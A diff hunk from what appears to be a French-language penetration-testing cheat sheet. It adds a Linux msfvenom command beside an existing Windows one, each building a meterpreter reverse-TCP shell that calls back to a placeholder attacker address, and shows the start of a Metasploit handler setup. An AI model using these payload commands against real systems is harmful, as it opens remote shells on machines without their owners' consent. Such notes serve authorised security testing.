@@ -158,6 +158,7 @@ sudo apt install python3-ldap
 Quand tu as besoin d'un reverse shell :
 ```
 msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
 ```
 ```
 use exploit/multi/handler
